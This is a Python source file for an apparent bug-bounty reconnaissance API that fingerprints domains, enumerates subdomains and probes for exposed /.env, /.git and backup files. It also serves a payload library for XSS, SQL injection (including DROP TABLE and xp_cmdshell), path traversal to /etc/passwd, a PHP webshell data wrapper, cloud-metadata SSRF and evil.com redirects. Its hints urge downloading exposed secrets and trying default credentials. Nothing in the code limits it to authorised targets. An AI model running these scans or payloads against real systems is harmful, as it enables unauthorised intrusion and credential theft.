import socket
import urllib.request
import urllib.parse
import urllib.error
import ssl
import json
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime


# ── TTL Cache ──────


class _TTLCache:
    def __init__(self):
        self._store: dict = {}
        self._lock = threading.Lock()

    def get(self, key: str):
        with self._lock:
            entry = self._store.get(key)
            if not entry:
                return None
            if time.time() - entry["ts"] > entry["ttl"]:
                del self._store[key]
                return None
            return entry["data"]

    def set(self, key: str, data, ttl: int = 600):
        with self._lock:
            self._store[key] = {"data": data, "ts": time.time(), "ttl": ttl}


_cache = _TTLCache()


def set_last_scan(key: str, data: dict):
    _cache.set(
        "__last__",
        {"key": key, "data": data, "timestamp": datetime.utcnow().isoformat() + "Z"},
        ttl=3600,
    )


def get_last_scan() -> dict:
    return _cache.get("__last__") or {}


# ── Constants ──────────────

SECURITY_HEADERS = [
    "strict-transport-security",
    "content-security-policy",
    "x-frame-options",
    "x-content-type-options",
    "referrer-policy",
    "permissions-policy",
    "x-xss-protection",
]

TECH_HEADERS = {
    "server": "Web server",
    "x-powered-by": "Backend language/framework",
    "x-aspnet-version": "ASP.NET version exposed",
    "x-generator": "CMS/generator",
    "via": "Proxy/CDN",
    "cf-ray": "Cloudflare CDN",
    "x-vercel-id": "Vercel",
    "x-amz-request-id": "AWS",
    "x-cache": "Caching layer",
    "x-shopify-stage": "Shopify",
    "x-drupal-cache": "Drupal CMS",
    "x-wp-total": "WordPress",
}

COMMON_PATHS = [
    "/admin",
    "/admin/login",
    "/administrator",
    "/api",
    "/api/v1",
    "/api/v2",
    "/api/v3",
    "/login",
    "/signin",
    "/auth",
    "/oauth",
    "/backup",
    "/backup.zip",
    "/db.sql",
    "/dump.sql",
    "/.env",
    "/.env.local",
    "/.env.backup",
    "/.git/config",
    "/.git/HEAD",
    "/config.php",
    "/config.json",
    "/config.yml",
    "/robots.txt",
    "/sitemap.xml",
    "/swagger",
    "/swagger-ui",
    "/openapi.json",
    "/api/docs",
    "/phpmyadmin",
    "/wp-admin",
    "/wp-login.php",
    "/xmlrpc.php",
    "/debug",
    "/status",
    "/health",
    "/metrics",
    "/actuator",
    "/console",
    "/shell",
    "/eval",
    "/graphql",
    "/graphiql",
    "/.well-known/security.txt",
]

ENDPOINT_PATHS = COMMON_PATHS + [
    "/api/v4",
    "/api/v5",
    "/api/users",
    "/api/user",
    "/api/admin",
    "/api/auth",
    "/api/token",
    "/api/login",
    "/api/register",
    "/api/profile",
    "/api/settings",
    "/api/config",
    "/api/search",
    "/api/products",
    "/api/orders",
    "/v1",
    "/v2",
    "/v3",
    "/user",
    "/users",
    "/account",
    "/accounts",
    "/dashboard",
    "/panel",
    "/manage",
    "/management",
    "/upload",
    "/uploads",
    "/files",
    "/file",
    "/static",
    "/assets",
    "/media",
    "/test",
    "/testing",
    "/dev",
    "/development",
    "/staging",
    "/old",
    "/backup2",
    "/bak",
    "/.htaccess",
    "/.htpasswd",
    "/server-status",
    "/server-info",
    "/trace",
    "/track",
    "/reset",
    "/forgot",
    "/recover",
    "/register",
    "/signup",
    "/logout",
    "/signout",
    "/search",
    "/find",
    "/download",
    "/export",
    "/report",
    "/reports",
    "/logs",
    "/log",
    "/error",
    "/errors",
]

COMMON_PARAMS = [
    {"name": "id", "risk": "high", "test": "IDOR — try id=1, id=2, id=0, id=-1"},
    {"name": "user_id", "risk": "high", "test": "IDOR — try other user IDs"},
    {"name": "uid", "risk": "high", "test": "IDOR — increment/decrement"},
    {"name": "account", "risk": "high", "test": "IDOR — try account=admin"},
    {
        "name": "redirect",
        "risk": "high",
        "test": "Open redirect — try redirect=https://evil.com",
    },
    {"name": "url", "risk": "high", "test": "SSRF — try url=http://127.0.0.1/"},
    {"name": "next", "risk": "high", "test": "Open redirect — try next=//evil.com"},
    {
        "name": "return",
        "risk": "medium",
        "test": "Open redirect — try return=//evil.com",
    },
    {
        "name": "callback",
        "risk": "high",
        "test": "SSRF/redirect — inject internal URLs",
    },
    {"name": "webhook", "risk": "high", "test": "SSRF — inject internal service URLs"},
    {"name": "file", "risk": "high", "test": "LFI — try file=../../../etc/passwd"},
    {"name": "path", "risk": "high", "test": "LFI — try path traversal payloads"},
    {"name": "page", "risk": "high", "test": "LFI — try page=../../../etc/passwd"},
    {"name": "template", "risk": "medium", "test": "SSTI — try template={{7*7}}"},
    {"name": "view", "risk": "medium", "test": "LFI — try view=../config"},
    {"name": "search", "risk": "medium", "test": "SQLi/XSS — inject in search param"},
    {"name": "q", "risk": "medium", "test": "SQLi/XSS — common search param"},
    {"name": "query", "risk": "medium", "test": "SQLi/XSS — inject queries"},
    {"name": "filter", "risk": "medium", "test": "SQLi — try filter=1 OR 1=1"},
    {"name": "order", "risk": "medium", "test": "SQLi — try order=id DESC,SLEEP(5)"},
    {"name": "sort", "risk": "low", "test": "SQLi — try sort=1 ASC,SLEEP(5)"},
    {
        "name": "token",
        "risk": "high",
        "test": "Auth bypass — try empty/null/admin token",
    },
    {"name": "key", "risk": "high", "test": "API key — check if leaked in response"},
    {
        "name": "api_key",
        "risk": "high",
        "test": "API key — try api_key=null or api_key=test",
    },
    {"name": "debug", "risk": "medium", "test": "Debug mode — try debug=true/1"},
    {
        "name": "admin",
        "risk": "high",
        "test": "Privilege escalation — try admin=true/1",
    },
    {"name": "role", "risk": "high", "test": "Privilege escalation — try role=admin"},
]

PAYLOADS = {
    "xss": [
        {
            "payload": "<script>alert(1)</script>",
            "label": "basic script tag",
            "context": "html",
        },
        {
            "payload": "<img src=x onerror=alert(1)>",
            "label": "img onerror",
            "context": "html",
        },
        {
            "payload": "'\"><script>alert(document.domain)</script>",
            "label": "attr breakout",
            "context": "attr",
        },
        {"payload": "<svg/onload=alert(1)>", "label": "svg onload", "context": "html"},
        {"payload": "javascript:alert(1)", "label": "js protocol", "context": "href"},
        {
            "payload": "<details open ontoggle=alert(1)>",
            "label": "details ontoggle",
            "context": "html",
        },
        {
            "payload": '"><img src=1 onerror=alert(1)>',
            "label": "quote breakout",
            "context": "attr",
        },
        {
            "payload": "<iframe src=javascript:alert(1)>",
            "label": "iframe js",
            "context": "html",
        },
        {"payload": "'-alert(1)-'", "label": "js string escape", "context": "js"},
        {
            "payload": "<body onload=alert(1)>",
            "label": "body onload",
            "context": "html",
        },
        {"payload": "{{7*7}}", "label": "SSTI probe", "context": "template"},
        {"payload": "${7*7}", "label": "EL injection probe", "context": "template"},
    ],
    "sqli": [
        {"payload": "' OR '1'='1", "label": "basic auth bypass", "context": "login"},
        {"payload": "' OR 1=1 --", "label": "comment bypass", "context": "login"},
        {"payload": "admin'--", "label": "admin comment", "context": "login"},
        {
            "payload": "' UNION SELECT NULL--",
            "label": "union 1col",
            "context": "search",
        },
        {
            "payload": "' UNION SELECT NULL,NULL--",
            "label": "union 2col",
            "context": "search",
        },
        {"payload": "' AND SLEEP(5)--", "label": "time-based blind", "context": "any"},
        {
            "payload": "' AND 1=2 UNION SELECT table_name FROM information_schema.tables--",
            "label": "schema dump",
            "context": "search",
        },
        {"payload": "1; DROP TABLE users--", "label": "destructive", "context": "any"},
        {
            "payload": "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",
            "label": "nested sleep",
            "context": "any",
        },
        {
            "payload": "'; EXEC xp_cmdshell('whoami')--",
            "label": "mssql rce",
            "context": "mssql",
        },
    ],
    "lfi": [
        {
            "payload": "../../../etc/passwd",
            "label": "basic traversal",
            "context": "linux",
        },
        {
            "payload": "....//....//etc/passwd",
            "label": "filter bypass",
            "context": "linux",
        },
        {
            "payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "label": "url encoded",
            "context": "linux",
        },
        {
            "payload": "..%252f..%252fetc%252fpasswd",
            "label": "double encoded",
            "context": "linux",
        },
        {"payload": "/proc/self/environ", "label": "proc environ", "context": "linux"},
        {"payload": "/etc/passwd", "label": "absolute path", "context": "linux"},
        {
            "payload": "php://filter/convert.base64-encode/resource=index.php",
            "label": "php wrapper",
            "context": "php",
        },
        {"payload": "php://input", "label": "php input stream", "context": "php"},
        {
            "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7",
            "label": "data wrapper rce",
            "context": "php",
        },
        {
            "payload": "/var/log/apache2/access.log",
            "label": "log poisoning",
            "context": "linux",
        },
        {
            "payload": "C:\\Windows\\win.ini",
            "label": "windows basic",
            "context": "windows",
        },
        {
            "payload": "..\\..\\..\\Windows\\win.ini",
            "label": "windows traversal",
            "context": "windows",
        },
    ],
    "ssrf": [
        {"payload": "http://127.0.0.1/", "label": "localhost", "context": "any"},
        {"payload": "http://localhost/", "label": "localhost dns", "context": "any"},
        {
            "payload": "http://169.254.169.254/latest/meta-data/",
            "label": "aws imds",
            "context": "aws",
        },
        {
            "payload": "http://metadata.google.internal/computeMetadata/v1/",
            "label": "gcp metadata",
            "context": "gcp",
        },
        {
            "payload": "http://100.100.100.200/latest/meta-data/",
            "label": "alibaba cloud",
            "context": "alibaba",
        },
        {"payload": "http://[::1]/", "label": "ipv6 localhost", "context": "any"},
        {"payload": "http://0.0.0.0/", "label": "zero addr", "context": "any"},
        {"payload": "http://2130706433/", "label": "decimal ip", "context": "bypass"},
        {"payload": "http://0177.0.0.1/", "label": "octal ip", "context": "bypass"},
        {
            "payload": "dict://127.0.0.1:6379/info",
            "label": "redis via dict",
            "context": "internal",
        },
        {"payload": "file:///etc/passwd", "label": "file protocol", "context": "linux"},
        {"payload": "http://127.0.0.1:8080/", "label": "alt port", "context": "any"},
    ],
    "open_redirect": [
        {"payload": "//evil.com", "label": "protocol-relative", "context": "redirect"},
        {
            "payload": "https://evil.com",
            "label": "absolute redirect",
            "context": "redirect",
        },
        {"payload": "/\\evil.com", "label": "backslash bypass", "context": "redirect"},
        {"payload": "/%2F/evil.com", "label": "encoded slash", "context": "redirect"},
        {
            "payload": "javascript:alert(1)",
            "label": "js protocol",
            "context": "redirect",
        },
        {
            "payload": "https://evil.com%23@good.com",
            "label": "fragment bypass",
            "context": "redirect",
        },
        {
            "payload": "https://good.com@evil.com",
            "label": "at-sign bypass",
            "context": "redirect",
        },
    ],
    "idor": [
        {"payload": "0", "label": "zero id", "context": "id_param"},
        {"payload": "-1", "label": "negative id", "context": "id_param"},
        {"payload": "null", "label": "null string", "context": "id_param"},
        {"payload": "undefined", "label": "undefined", "context": "id_param"},
        {"payload": "true", "label": "boolean true", "context": "id_param"},
        {"payload": "admin", "label": "admin string", "context": "id_param"},
        {"payload": "1' OR '1'='1", "label": "sqli in id", "context": "id_param"},
        {
            "payload": "../../../admin",
            "label": "traversal in id",
            "context": "id_param",
        },
    ],
}


# ── HTTP Helpers ─────


def _make_request(url: str, timeout: int = 5):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={"User-Agent": "CyberTools-API/2.0"})
    try:
        res = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return res, None
    except urllib.error.HTTPError as e:
        return e, None
    except Exception as e:
        return None, str(e)


def _headers_dict(response) -> dict:
    return dict(response.headers)


def _missing_security_headers(headers: dict) -> list:
    lower = {k.lower() for k in headers}
    return [h for h in SECURITY_HEADERS if h not in lower]


def _tech_hints(headers: dict) -> list:
    hints = []
    lower_h = {k.lower(): v for k, v in headers.items()}
    for header, label in TECH_HEADERS.items():
        if header in lower_h:
            hints.append(f"{label}: {lower_h[header]}")
    return hints


def _ssl_info(domain: str) -> dict:
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(
            socket.create_connection((domain, 443), timeout=4), server_hostname=domain
        ) as s:
            cert = s.getpeercert()
        expire_str = cert.get("notAfter", "")
        expire_dt = (
            datetime.strptime(expire_str, "%b %d %H:%M:%S %Y %Z")
            if expire_str
            else None
        )
        days_left = (expire_dt - datetime.utcnow()).days if expire_dt else None
        issuer = dict(x[0] for x in cert.get("issuer", []))
        subject = dict(x[0] for x in cert.get("subject", []))
        sans = [v for t, v in cert.get("subjectAltName", []) if t == "DNS"]
        return {
            "valid": True,
            "expires": expire_str,
            "days_remaining": days_left,
            "issuer": issuer.get("organizationName", "unknown"),
            "subject": subject.get("commonName", domain),
            "san": sans[:8],
            "warning": (
                "Certificate expires soon!" if days_left and days_left < 30 else None
            ),
        }
    except ssl.SSLCertVerificationError:
        return {"valid": False, "error": "SSL certificate verification failed."}
    except Exception as e:
        return {"valid": None, "error": str(e)}


def _probe_path(base: str, path: str, timeout: int = 3) -> dict:

    target = base.rstrip("/") + path
    res, err = _make_request(target, timeout=timeout)
    if res is not None:
        code = res.status if hasattr(res, "status") else res.code
        size = int(res.headers.get("content-length", 0) or 0)
        return {"path": path, "url": target, "status": code, "size": size}
    return {"path": path, "url": target, "status": "error", "size": 0}


# ── DNS via Cloudflare DoH ──────


def _dns_lookup(domain: str) -> dict:
    cached = _cache.get(f"dns:{domain}")
    if cached:
        return cached

    record_types = ["A", "MX", "TXT", "NS", "CNAME"]
    results: dict = {}

    def _query(rtype: str):
        url = f"https://cloudflare-dns.com/dns-query?name={urllib.parse.quote(domain)}&type={rtype}"
        try:
            req = urllib.request.Request(
                url,
                headers={
                    "Accept": "application/dns-json",
                    "User-Agent": "CyberTools-API/2.0",
                },
            )
            with urllib.request.urlopen(req, timeout=4) as res:
                data = json.loads(res.read())
            records = []
            for a in data.get("Answer", []):
                val = a.get("data", "").strip('"')
                if val and val not in records:
                    records.append(val)
            return rtype, records
        except Exception:
            return rtype, []

    with ThreadPoolExecutor(max_workers=5) as pool:
        futures = {pool.submit(_query, rt): rt for rt in record_types}
        for f in as_completed(futures):
            rtype, records = f.result()
            if records:
                results[rtype] = records

    _cache.set(f"dns:{domain}", results, ttl=600)
    return results


# ── Recon ─────────


def recon_domain(domain: str) -> dict:
    domain = (
        domain.strip().removeprefix("https://").removeprefix("http://").split("/")[0]
    )

    cached = _cache.get(f"recon:{domain}")
    if cached:
        return cached

    def _get_ip():
        try:
            return socket.gethostbyname(domain)
        except Exception:
            return None

    with ThreadPoolExecutor(max_workers=3) as pool:
        f_ip = pool.submit(_get_ip)
        f_dns = pool.submit(_dns_lookup, domain)
        f_ssl = pool.submit(_ssl_info, domain)

    ip = f_ip.result()
    dns = f_dns.result()
    ssl_inf = f_ssl.result()

    if not ip:
        ip = (dns.get("A") or [""])[0] or "unresolved"

    res, err = _make_request(f"https://{domain}")
    protocol = "https"
    if res is None:
        res, err = _make_request(f"http://{domain}")
        protocol = "http"

    status_code = None
    headers = {}
    if res is not None:
        status_code = res.status if hasattr(res, "status") else res.code
        headers = _headers_dict(res)

    lower_h = {k.lower(): v for k, v in headers.items()}
    missing_sec = _missing_security_headers(headers)
    tech = _tech_hints(headers)

    summary = []
    if status_code:
        summary.append(f"Host reachable via {protocol.upper()} — HTTP {status_code}.")
    else:
        summary.append(f"Host unreachable. Error: {err}")

    if ssl_inf.get("valid"):
        d = ssl_inf.get("days_remaining")
        summary.append(f"SSL valid — expires in {d} days ({ssl_inf.get('issuer')}).")
        if d and d < 30:
            summary.append("Warning: Certificate expiring soon — check renewal.")
        if ssl_inf.get("san"):
            summary.append(
                f"SAN entries: {', '.join(ssl_inf['san'][:4])} — potential subdomains."
            )
    elif ssl_inf.get("valid") is False:
        summary.append(f"SSL issue: {ssl_inf.get('error')}")

    if dns.get("MX"):
        summary.append(f"Mail servers: {', '.join(dns['MX'][:3])}.")
    if dns.get("TXT"):
        txt_flat = " ".join(dns["TXT"])
        if "v=spf1" in txt_flat:
            summary.append(
                "SPF record present — check for misconfigured 'all' directive."
            )
        if "v=DMARC1" in txt_flat:
            summary.append("DMARC record present.")

    if missing_sec:
        summary.append(
            f"Missing {len(missing_sec)} security header(s): {', '.join(missing_sec)}."
        )
    else:
        summary.append("All major security headers present.")

    if tech:
        summary.append(f"Stack detected: {'; '.join(tech)}.")

    if lower_h.get("access-control-allow-origin") == "*":
        summary.append("CORS wildcard (*) detected — any origin can read responses.")

    next_steps = []
    if "content-security-policy" not in lower_h:
        next_steps.append("No CSP — test XSS in all inputs and reflected URL params.")
    if "x-frame-options" not in lower_h:
        next_steps.append("No X-Frame-Options — try a clickjacking PoC.")
    if any("wordpress" in t.lower() or "wp-" in t.lower() for t in tech):
        next_steps.append(
            "WordPress — check /wp-login.php, xmlrpc.php, enumerate plugins."
        )
    if any("php" in t.lower() for t in tech):
        next_steps.append("PHP detected — test LFI payloads in file path parameters.")
    if any("server" in t.lower() for t in tech):
        next_steps.append("Server version exposed — search for CVEs on that version.")
    if dns.get("MX"):
        next_steps.append(
            "Check mail server config: SPF, DKIM, DMARC for spoofing opportunities."
        )
    if ssl_inf.get("san"):
        next_steps.append(
            f"SAN reveals extra domains — recon each: {', '.join(ssl_inf['san'][:3])}."
        )
    next_steps.append(f"Run /expand?domain={domain} to discover subdomains.")
    next_steps.append(f"Run /bb-scan?url=https://{domain} to probe sensitive paths.")
    next_steps.append("Test IDOR by incrementing numeric IDs in API paths.")
    next_steps.append("Run /workflow for full automated pipeline.")

    result = {
        "domain": domain,
        "ip": ip,
        "protocol": protocol,
        "status_code": status_code,
        "ssl": ssl_inf,
        "dns": dns,
        "headers": headers,
        "missing_security_headers": missing_sec,
        "tech_hints": tech,
        "smart_summary": summary,
        "next_steps": next_steps,
    }
    _cache.set(f"recon:{domain}", result, ttl=600)
    set_last_scan(domain, result)
    return result


# ── URL Analyzer ─────────


def analyze_url(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    cached = _cache.get(f"analyze:{url}")
    if cached:
        return cached

    redirect_chain = []
    current = url
    for _ in range(8):
        res, err = _make_request(current)
        if res is None:
            break
        code = res.status if hasattr(res, "status") else res.code
        redirect_chain.append({"url": current, "status": code})
        if code in (301, 302, 303, 307, 308):
            loc = dict(res.headers).get("Location") or dict(res.headers).get("location")
            if loc:
                if loc.startswith("/"):
                    parsed = urllib.parse.urlparse(current)
                    loc = f"{parsed.scheme}://{parsed.netloc}{loc}"
                current = loc
            else:
                break
        else:
            break

    final_url = current
    final_status = redirect_chain[-1]["status"] if redirect_chain else None
    final_headers = {}
    if res is not None and final_status not in (301, 302, 303, 307, 308):
        final_headers = _headers_dict(res)
    elif final_url != url:
        res2, _ = _make_request(final_url, timeout=4)
        if res2 is not None:
            final_headers = _headers_dict(res2)

    lower_h = {k.lower(): v for k, v in final_headers.items()}
    misconfig = []

    if lower_h.get("access-control-allow-origin") == "*":
        misconfig.append(
            "CORS wildcard (*) — unauthenticated cross-origin reads possible."
        )
    if (
        lower_h.get("access-control-allow-credentials") == "true"
        and lower_h.get("access-control-allow-origin") == "*"
    ):
        misconfig.append(
            "CORS: allow-credentials + wildcard origin — critical misconfiguration."
        )
    if not lower_h.get("strict-transport-security"):
        misconfig.append("No HSTS — connection can be downgraded to HTTP.")
    if lower_h.get("x-powered-by"):
        misconfig.append(f"X-Powered-By exposes stack: {lower_h['x-powered-by']}")
    if lower_h.get("server"):
        misconfig.append(f"Server header exposes version: {lower_h['server']}")
    if not lower_h.get("content-security-policy"):
        misconfig.append("No Content-Security-Policy — XSS mitigations absent.")
    if not lower_h.get("x-frame-options") and not lower_h.get(
        "content-security-policy"
    ):
        misconfig.append(
            "No clickjacking protection (X-Frame-Options or CSP frame-ancestors)."
        )

    summary = []
    if len(redirect_chain) > 1:
        summary.append(
            f"{len(redirect_chain)-1} redirect(s): {redirect_chain[0]['url']} → {final_url}"
        )
    if misconfig:
        summary.append(f"{len(misconfig)} misconfiguration(s) detected.")
    else:
        summary.append("No obvious header misconfigurations found.")

    next_steps = []
    for item in misconfig:
        if "CORS" in item:
            next_steps.append(
                "Test CORS: send cross-origin request with credentials, check if data leaks."
            )
        if "HSTS" in item:
            next_steps.append("No HSTS — attempt SSL downgrade in MitM scenario.")
        if "CSP" in item or "XSS" in item:
            next_steps.append("No CSP — inject XSS payloads in all reflected params.")
        if "clickjacking" in item.lower():
            next_steps.append(
                "Build a clickjacking PoC: embed target in iframe on your server."
            )
    next_steps = list(dict.fromkeys(next_steps))

    result = {
        "url": url,
        "redirect_chain": redirect_chain,
        "final_url": final_url,
        "final_status": final_status,
        "headers": final_headers,
        "misconfig_hints": misconfig,
        "smart_summary": summary,
        "next_steps": next_steps,
    }
    _cache.set(f"analyze:{url}", result, ttl=300)
    return result


# ── BB Scan ────────


def bb_scan(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    cached = _cache.get(f"bbscan:{url}")
    if cached:
        return cached

    base = url.rstrip("/")
    probed = []
    found_paths = []

    with ThreadPoolExecutor(max_workers=20) as pool:
        futures = {pool.submit(_probe_path, base, path): path for path in COMMON_PATHS}
        for f in as_completed(futures):
            result = f.result()
            probed.append(result)
            s = result["status"]
            if isinstance(s, int) and s != 404:
                found_paths.append(result)

    found_paths.sort(key=lambda x: (x["status"] != 200, x["status"]))

    hints = []
    next_steps = []
    for p in found_paths:
        s = p["status"]
        path = p["path"]
        if s == 200:
            if "env" in path:
                hints.append(
                    f"CRITICAL: {path} accessible — may contain secrets/credentials."
                )
            elif "git" in path:
                hints.append(f"CRITICAL: {path} accessible — source code exposure.")
            elif any(x in path for x in ["backup", "sql", "dump"]):
                hints.append(
                    f"HIGH: {path} accessible — download and inspect for credentials."
                )
            elif "admin" in path:
                hints.append(
                    f"HIGH: {path} accessible — test default creds/auth bypass."
                )
            elif any(x in path for x in ["swagger", "openapi", "docs"]):
                hints.append(
                    f"INFO: {path} — API docs exposed, enumerate all endpoints."
                )
            elif "graphql" in path:
                hints.append(
                    f"INFO: {path} — test introspection: {{__schema{{types{{name}}}}}}"
                )
            elif any(x in path for x in ["health", "status", "metrics"]):
                hints.append(f"INFO: {path} — check response for internal data.")
            else:
                hints.append(f"{path} → HTTP {s} — inspect response.")
        elif s in (301, 302):
            next_steps.append(
                f"{path} → {s}: follow redirect, check destination for auth bypass."
            )
        elif s == 403:
            next_steps.append(
                f"{path} → 403: try X-Forwarded-For: 127.0.0.1, double slash, path normalization."
            )
        elif s == 500:
            next_steps.append(f"{path} → 500: inspect response body for stack traces.")
        elif s == 401:
            next_steps.append(
                f"{path} → 401: test default credentials admin:admin, admin:password."
            )

    next_steps.append("Use ffuf/gobuster for deeper wordlist scanning.")
    next_steps.append("Use /payloads?type=sqli for forms found during scanning.")

    summary = []
    if found_paths:
        summary.append(f"{len(found_paths)} interesting path(s) found (non-404).")
        for p in found_paths[:6]:
            summary.append(f"  {p['path']} -> HTTP {p['status']}")
    else:
        summary.append(
            "No exposed paths found. Try deeper wordlist with ffuf/gobuster."
        )
    summary.append(f"Probed {len(probed)} paths.")

    result = {
        "target": url,
        "paths_probed": len(probed),
        "interesting_paths": found_paths,
        "all_results": sorted(probed, key=lambda x: str(x["status"])),
        "bug_bounty_hints": hints,
        "smart_summary": summary,
        "next_steps": next_steps,
    }
    _cache.set(f"bbscan:{url}", result, ttl=300)
    set_last_scan(url, result)
    return result


# ── Payload Generator ───────


def get_payloads(ptype: str, context: str = None) -> dict:
    ptype = ptype.lower().strip()
    if ptype not in PAYLOADS:
        return {"error": f"Unknown type '{ptype}'.", "available": list(PAYLOADS.keys())}

    descriptions = {
        "xss": "Cross-Site Scripting — inject into inputs, URL params, headers.",
        "sqli": "SQL Injection — inject into login forms, search, ID params.",
        "lfi": "Local File Inclusion — inject into file path parameters.",
        "ssrf": "Server-Side Request Forgery — inject into URL/webhook/callback fields.",
        "open_redirect": "Open Redirect — inject into redirect/next/return/url params.",
        "idor": "IDOR — inject into numeric ID parameters.",
    }
    usage_tips = {
        "xss": [
            "Test in ?q=PAYLOAD",
            "Try in form inputs",
            "Inject in User-Agent/Referer if reflected",
        ],
        "sqli": [
            "Try in login fields",
            "Add to ?id=1PAYLOAD",
            "Use SLEEP() to confirm blind SQLi",
        ],
        "lfi": [
            "Replace ?page=PAYLOAD",
            "Combine with PHP wrappers on PHP sites",
            "Try /proc/self/environ",
        ],
        "ssrf": [
            "Inject into URL/callback/webhook fields",
            "Test cloud metadata endpoints",
            "Try dict:// and file://",
        ],
        "open_redirect": [
            "Inject into redirect=/next=/return= params",
            "Try URL encoding",
            "Combine with XSS",
        ],
        "idor": [
            "Replace numeric IDs with 0, -1, null",
            "Try other user IDs",
            "Encode as UUID or base64",
        ],
    }

    items = PAYLOADS[ptype]
    if context:
        filtered = [p for p in items if p.get("context") == context]
        items = filtered if filtered else items

    return {
        "type": ptype,
        "context": context,
        "description": descriptions.get(ptype, ""),
        "count": len(items),
        "payloads": items,
        "usage_tips": usage_tips.get(ptype, []),
        "smart_summary": [
            f"{len(items)} {ptype.upper()} payloads ready.",
            descriptions.get(ptype, ""),
            f"Start with: {usage_tips.get(ptype, [''])[0]}",
        ],
    }


# ── Expand Target ───────


def expand_target(domain: str) -> dict:
    domain = (
        domain.strip().removeprefix("https://").removeprefix("http://").split("/")[0]
    )

    cached = _cache.get(f"expand:{domain}")
    if cached:
        return cached

    subdomains: set = set()
    sources_used: list = []

    def _crtsh():
        found = []
        try:
            url = f"https://crt.sh/?q=%.{urllib.parse.quote(domain)}&output=json"
            req = urllib.request.Request(
                url, headers={"User-Agent": "CyberTools-API/2.0"}
            )
            with urllib.request.urlopen(req, timeout=8) as res:
                data = json.loads(res.read())
            for entry in data:
                for name in entry.get("name_value", "").splitlines():
                    name = name.strip().lstrip("*.")
                    if name.endswith(f".{domain}") or name == domain:
                        found.append(name)
        except Exception:
            pass
        return "crt.sh", list(set(found))

    def _hackertarget():
        found = []
        try:
            url = f"https://api.hackertarget.com/hostsearch/?q={urllib.parse.quote(domain)}"
            req = urllib.request.Request(
                url, headers={"User-Agent": "CyberTools-API/2.0"}
            )
            with urllib.request.urlopen(req, timeout=8) as res:
                text = res.read().decode()
            for line in text.splitlines():
                parts = line.split(",")
                if parts and parts[0].strip().endswith(f".{domain}"):
                    found.append(parts[0].strip())
        except Exception:
            pass
        return "hackertarget", found

    def _san():
        found = []
        try:
            ssl_data = _ssl_info(domain)
            for san in ssl_data.get("san", []):
                san = san.lstrip("*.")
                if san.endswith(f".{domain}") or san == domain:
                    found.append(san)
        except Exception:
            pass
        return "ssl_san", found

    with ThreadPoolExecutor(max_workers=3) as pool:
        futures = [pool.submit(_crtsh), pool.submit(_hackertarget), pool.submit(_san)]
        for f in as_completed(futures):
            source, found = f.result()
            if found:
                sources_used.append(source)
                subdomains.update(found)

    subs_list = sorted(subdomains)

    def _check_live(sub):
        try:
            ip = socket.gethostbyname(sub)
            return {"subdomain": sub, "ip": ip, "live": True}
        except Exception:
            return {"subdomain": sub, "ip": None, "live": False}

    live_results = []
    with ThreadPoolExecutor(max_workers=20) as pool:
        futures = [pool.submit(_check_live, s) for s in subs_list[:80]]
        for f in as_completed(futures):
            live_results.append(f.result())

    live_results.sort(key=lambda x: (not x["live"], x["subdomain"]))
    live_count = sum(1 for x in live_results if x["live"])

    summary = [
        f"Found {len(live_results)} subdomain(s) across {len(sources_used)} source(s).",
        f"{live_count} subdomain(s) resolve to live IPs.",
    ]
    if live_count:
        summary.append("Run /recon on each live subdomain for full analysis.")

    next_steps = [
        "Run /recon?domain=<subdomain> on each live result.",
        "Check for subdomain takeover: unregistered CNAMEs pointing to cloud services.",
        "Look for dev/staging subdomains — they often have weaker security.",
        "Test each subdomain for the same vulnerabilities as the main domain.",
    ]

    result = {
        "domain": domain,
        "sources": sources_used,
        "total_found": len(live_results),
        "live_count": live_count,
        "subdomains": live_results,
        "smart_summary": summary,
        "next_steps": next_steps,
    }
    _cache.set(f"expand:{domain}", result, ttl=600)
    set_last_scan(f"expand:{domain}", result)
    return result


# ── Find Endpoints ────────


def find_endpoints(url: str) -> dict:
    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    cached = _cache.get(f"endpoints:{url}")
    if cached:
        return cached

    base = url.rstrip("/")
    found = []
    all_results = []

    with ThreadPoolExecutor(max_workers=20) as pool:
        futures = {pool.submit(_probe_path, base, path): path for path in ENDPOINT_PATHS}
        for f in as_completed(futures):
            r = f.result()
            all_results.append(r)
            s = r["status"]
            if isinstance(s, int) and s not in (404, 410):
                found.append(r)

    found.sort(key=lambda x: (x["status"] != 200, x["status"]))

    for ep in found:
        p = ep["path"]
        if any(
            x in p
            for x in ["/api", "/v1", "/v2", "/v3", "/graphql", "/openapi", "/swagger"]
        ):
            ep["type"] = "api"
        elif any(x in p for x in ["/admin", "/dashboard", "/panel", "/manage"]):
            ep["type"] = "admin"
        elif any(x in p for x in ["/login", "/auth", "/signin", "/oauth"]):
            ep["type"] = "auth"
        elif any(x in p for x in ["/.env", "/.git", "/config", "/backup", "/.ht"]):
            ep["type"] = "sensitive"
        elif any(x in p for x in ["/health", "/status", "/metrics", "/debug"]):
            ep["type"] = "monitoring"
        else:
            ep["type"] = "other"

    summary = [
        f"Probed {len(ENDPOINT_PATHS)} paths. {len(found)} endpoint(s) found (non-404)."
    ]
    if any(ep["type"] == "sensitive" and ep["status"] == 200 for ep in found):
        summary.append("CRITICAL: Sensitive files/directories are accessible!")
    if any(ep["type"] == "api" for ep in found):
        summary.append(
            "API endpoints discovered — enumerate for auth issues and data exposure."
        )

    next_steps = []
    if any(ep["type"] == "api" for ep in found):
        next_steps.append(
            "Enumerate API: try /api/v1/users, /api/v1/admin, fuzzing with ffuf."
        )
        next_steps.append(
            "Test API endpoints for IDOR, missing auth, broken object-level auth."
        )
    if any(ep["type"] == "admin" for ep in found):
        next_steps.append(
            "Admin panel found — test default credentials and auth bypass."
        )
    if any(ep["type"] == "sensitive" for ep in found):
        next_steps.append(
            "Download sensitive files immediately and inspect for credentials/keys."
        )
    if any(ep["type"] == "monitoring" for ep in found):
        next_steps.append(
            "Check monitoring endpoints for internal IPs, service names, and metrics."
        )
    next_steps.append(
        "Run /params on discovered endpoints to find injectable parameters."
